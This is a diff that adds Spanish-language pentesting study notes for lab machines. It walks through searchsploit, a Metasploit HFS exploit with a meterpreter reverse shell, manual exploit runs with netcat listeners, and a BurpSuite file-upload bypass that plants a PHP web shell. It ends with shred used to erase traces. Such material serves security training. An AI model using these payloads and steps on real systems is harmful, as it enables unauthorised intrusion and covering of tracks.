@@ -654,6 +654,261 @@ Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios 
     ```
     Ajustamos las proporciones de la terminal para tener una shell interactiva y cómoda.
 
+Este proceso nos permite hackear la máquina víctima, ganar acceso no privilegiado y configurar la terminal para trabajar de forma eficiente.
+
 ---
 
-Este proceso nos permite hackear la máquina víctima, ganar acceso no privilegiado y configurar la terminal para trabajar de forma eficiente.
+# Uso de Searchsploit y Exploit-DB para la Búsqueda de Vulnerabilidades
+
+## Introducción
+
+Searchsploit es una herramienta que se comunica con la página de exploit-db, una fuente centralizada donde se alojan exploits de todo tipo. Todo lo que aparece en la página web puede ser consultado desde la consola utilizando searchsploit.
+
+## Instalación y Actualización
+
+1. **Instalar Searchsploit**:
+    ```bash
+    apt install exploitdb -y
+    ```
+
+2. **Actualizar la Base de Datos**:
+    ```bash
+    searchsploit -u
+    ```
+
+## Uso de Searchsploit
+
+1. **Buscar Exploits**:
+    ```bash
+    searchsploit Http File Server
+    ```
+    Este comando busca exploits relacionados con "Http File Server".
+
+2. **Obtener URL de Exploit-DB**:
+    ```bash
+    searchsploit Http File Server -w
+    ```
+    Este comando muestra la dirección URL de exploit-db para consultas web.
+
+3. **Ver Código Fuente del Exploit**:
+    ```bash
+    searchsploit -x <identificador>
+    ```
+
+4. **Mover Exploit al Directorio Actual**:
+    ```bash
+    searchsploit -m <identificador>
+    ```
+    Mueve el exploit con el identificador dado al directorio de trabajo actual.
+
+---
+
+# Diferencia entre Vulnerabilidades Locales y Remotas
+
+## Vulnerabilidad Remota
+Un exploit que se ejecuta de manera remota desde la máquina del atacante hacia la máquina víctima, sin necesidad de tener acceso interactivo a la máquina víctima.
+
+## Vulnerabilidad Local
+Un exploit que se ejecuta localmente en la máquina víctima, como una escalada de privilegios. Esto se realiza normalmente después de comprometer la máquina con un usuario de bajos privilegios.
+
+---
+
+# Uso de la Herramienta Metasploit
+
+## Introducción
+
+Metasploit es una herramienta poderosa para encontrar y explotar vulnerabilidades. A continuación, se detalla cómo utilizar Metasploit para explotar un servicio web Http File Server (HFS).
+
+## Configuración Inicial
+
+1. **Inicializar Metasploit**:
+    ```bash
+    msfdb run
+    ```
+
+2. **Buscar Exploits**:
+    ```bash
+    search hfs
+    ```
+
+3. **Seleccionar y Cargar un Exploit**:
+    ```bash
+    use exploit/windows/http/rejetto_hfs_exec
+    ```
+
+4. **Obtener Información del Exploit**:
+    ```bash
+    info
+    ```
+
+5. **Mostrar Opciones del Exploit**:
+    ```bash
+    show options
+    ```
+
+6. **Configurar Opciones del Exploit**:
+    ```bash
+    set <option> <value>
+    ```
+
+## Configuración del Listener
+
+1. **Configurar Payload**:
+    ```bash
+    set payload windows/meterpreter/reverse_tcp
+    ```
+
+2. **Configurar Opciones del Payload**:
+    ```bash
+    set LHOST 10.10.14.18
+    set LPORT 4645
+    ```
+
+3. **Ejecutar el Exploit**:
+    ```bash
+    exploit
+    ```
+
+## Sesión Meterpreter
+
+Si el exploit es exitoso, se abrirá una sesión Meterpreter. Para obtener una consola interactiva:
+```bash
+shell
+```
+
+---
+
+# Explotación Manual de la Vulnerabilidad (Sin Metasploit)
+
+## Introducción
+
+Este proceso detalla cómo explotar manualmente una vulnerabilidad sin utilizar Metasploit.
+
+## Uso de Searchsploit
+
+1. **Buscar Exploit**:
+    ```bash
+    searchsploit http file server
+    ```
+
+2. **Mover Exploit al Directorio Actual**:
+    ```bash
+    searchsploit -m <id>
+    ```
+
+## Configuración y Ejecución
+
+1. **Modificar el Exploit**:
+    Cambiar la IP y el puerto en el exploit para configurar la reverse shell.
+
+2. **Iniciar Servidor Web**:
+    ```bash
+    python -m SimpleHTTPServer 80
+    ```
+
+3. **Poner en Escucha con Netcat**:
+    ```bash
+    nc -nlvp 443
+    ```
+
+4. **Ejecutar el Exploit**:
+    ```bash
+    python 39161.py 10.10.10.8 80
+    ```
+    Es posible que necesite ejecutar el exploit varias veces para que funcione correctamente.
+
+5. **Ganar Acceso**:
+    Si el exploit es exitoso, se ganará acceso a la máquina víctima a través de una reverse shell.
+
+
+Estos pasos proporcionan una guía completa para utilizar Searchsploit, Exploit-DB y Metasploit para la búsqueda y explotación de vulnerabilidades, así como para entender la diferencia entre vulnerabilidades locales y remotas y cómo explotarlas manualmente.
+
+---
+
+# Uso de la Herramienta BurpSuite
+
+## Introducción
+
+BurpSuite es una herramienta poderosa para pentesting web, actuando como un intermediario (proxy) que permite interceptar y analizar peticiones. A continuación, se describe su configuración y uso.
+
+## Configuración
+
+1. **Abrir BurpSuite**:
+    ```bash
+    burpsuite
+    ```
+
+2. **Configuración del Proxy en BurpSuite**:
+    - Ir a `Proxy` -> `Proxy settings`.
+    - La dirección debe estar en `localhost (127.0.0.1)` y el puerto en `8080`.
+
+3. **Configurar el Navegador (Firefox)**:
+    - Ir a `Settings` -> `Network` -> `Network settings`.
+    - Seleccionar `Manual proxy configuration` y poner `localhost` y puerto `8080`.
+    - Marcar la opción `Also set this proxy for HTTPS`.
+
+4. **Problemas con HTTPS**:
+    - Ir a la página `https://burp/` y descargar el certificado.
+    - En el navegador (Firefox), ir a `Settings` -> `Certificates` e importar el certificado descargado.
+
+5. **Definir un Scope**:
+    - Esto se hace para capturar solo las peticiones de una URL específica, evitando ruido innecesario.
+
+---
+
+# BurpSuite - Definición de Scope y Comprometiendo un Servidor Web
+
+## Definir un Scope
+
+1. **Limpiar Items Activos**:
+    - Borrar los items en `HTTP history` y `Site map`.
+
+2. **Configurar Scope**:
+    - Ir a `Options` y marcar `Don't send items to Proxy history or live tasks, if out of scope`.
+    - Ir a `Target` -> `Scope` y añadir la URL de la web víctima.
+
+## Comprometer un Servidor Web
+
+1. **Fuzzear el Servidor**:
+    - Utilizar `Wfuzz` para descubrir rutas potenciales en `10.10.10.6/FUZZ`.
+    - Encontrar la ruta `10.10.10.6/torrent/`.
+
+2. **Registro y Subida de Archivos**:
+    - Registrarse como un usuario normal y subir un archivo torrent.
+    - Intentar subir un archivo `.php` malicioso con una web-shell:
+        ```php
+        <?php
+            echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+        ?>
+        ```
+    - Comprobar que la web-shell funciona ejecutando `http://localhost/shell.php?cmd=whoami`.
+
+3. **Subir Archivo Malicioso con BurpSuite**:
+    - Interceptar la petición de subida con BurpSuite.
+    - Modificar el `Content-Type` a `image/jpeg` y cambiar el `filename` a un archivo `.php` con el código malicioso.
+    - Forward la petición para que viaje al servidor.
+
+4. **Localizar y Ejecutar el Archivo Subido**:
+    - Encontrar la ubicación del archivo subido.
+    - Ejecutar el archivo `.php` en la URL para obtener ejecución remota de comandos.
+
+5. **Lanzar una Reverse-Shell**:
+    - Utilizar una reverse-shell desde `pentestmonkey.net`.
+    - Configurar Netcat en la máquina atacante para escuchar en el puerto 443.
+    - Ejecutar el comando de la reverse-shell en la URL del archivo malicioso.
+
+6. **Obtener una Shell Interactiva**:
+    - Tratar la tty para obtener una shell completamente interactiva en la máquina víctima.
+
+7. **Crowling Automático de BurpSuite**:
+    - BurpSuite hace crowling del servidor web para encontrar archivos y directorios adicionales y reportar issues de seguridad.
+
+8. **Borrar el Archivo PHP** (Opcional):
+    - Utilizar el comando `shred` para borrar el archivo sin dejar rastro:
+        ```bash
+        shred -zun 10 -v <nombre archivo>
+        ```
+
+Estos pasos proporcionan una guía completa para utilizar BurpSuite en el pentesting de aplicaciones web, incluyendo la configuración inicial, la definición de un scope, y la explotación de vulnerabilidades mediante la subida de archivos maliciosos y la ejecución de comandos remotos.
+
+---
